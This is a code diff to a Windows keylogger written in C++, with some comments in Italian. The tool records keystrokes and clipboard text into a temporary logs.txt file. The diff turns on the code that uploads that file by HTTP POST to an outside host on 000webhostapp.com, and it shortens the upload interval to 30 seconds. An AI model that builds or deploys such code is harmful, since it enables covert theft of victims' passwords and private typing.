@@ -8,6 +8,8 @@
 #include <iomanip>
 #include <iphlpapi.h>
 
+#include "Libs/include/curl/curl.h"
+
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 #pragma comment(lib,"ws2_32.lib") // ws2_32.dll windows' library
 #pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
@@ -67,7 +69,7 @@ char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFol
 DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
 
-const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes
+const std::chrono::seconds waitTime = std::chrono::seconds(int(30)); // seconds -> 15 minutes
 
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
@@ -617,26 +619,37 @@ void timeCheck() {
 		if (outputFile.is_open()) outputFile << tmp;
 		outputFile.close();
 
-		//// sending the file to the server
-		//CURL* curl;
-		//CURLcode res;
-		//curl_global_init(CURL_GLOBAL_ALL);
-		//curl = curl_easy_init();
+		// sending the file to the server
+		CURL* curl;
+		CURLcode res;
+		curl_global_init(CURL_GLOBAL_ALL);
+		curl = curl_easy_init();
 
-		//if (curl) {
-		//	curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
-		//	curl_mime* mime;
-		//	curl_mimepart* part;
-		//	mime = curl_mime_init(curl);
-		//	part = curl_mime_addpart(mime);
-		//	curl_mime_name(part, "file");
-		//	curl_mime_filedata(part, FilePath.c_str());
-		//	curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-		//	res = curl_easy_perform(curl);
-		//	curl_easy_cleanup(curl);
-		//	curl_mime_free(mime);
-		//}
-		//curl_global_cleanup();
+		if (curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
+
+			// Imposta il file da inviare
+			struct curl_httppost* formpost = NULL;
+			struct curl_httppost* lastptr = NULL;
+			curl_formadd(&formpost, &lastptr,
+				CURLFORM_COPYNAME, "file",
+				CURLFORM_FILE, FilePath.c_str(),
+				CURLFORM_END);
+
+			// Imposta il form con il file da inviare
+			curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+
+			// Effettua la richiesta
+			res = curl_easy_perform(curl);
+
+			if (res != CURLE_OK)
+				std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+
+			// Pulisce
+			curl_easy_cleanup(curl);
+			curl_formfree(formpost);
+		}
+		curl_global_cleanup();
 
 		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
 		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
